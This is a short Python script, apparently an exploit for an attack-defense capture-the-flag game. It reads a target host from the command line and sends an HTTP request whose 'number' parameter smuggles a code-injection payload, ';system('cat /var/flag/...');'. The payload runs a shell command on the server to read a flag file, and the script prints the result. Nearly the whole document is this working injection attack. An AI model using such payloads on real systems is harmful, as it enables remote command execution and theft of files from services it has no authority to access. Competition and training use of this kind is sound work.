#!/usr/bin/python3
import sys


def arg_reciever():
    argv = sys.argv
    host = argv[1]
    submit_host = argv[2]
    args = argv[3:]
    return host, submit_host, args


HOST, submit_host, args = arg_reciever()

# rest of the code
import requests

url = f"http://{HOST}:50000/?number=%27;system(%27cat%20/var/flag/00000000000000000000000000000000%27);%27"
print(requests.get(url).text)
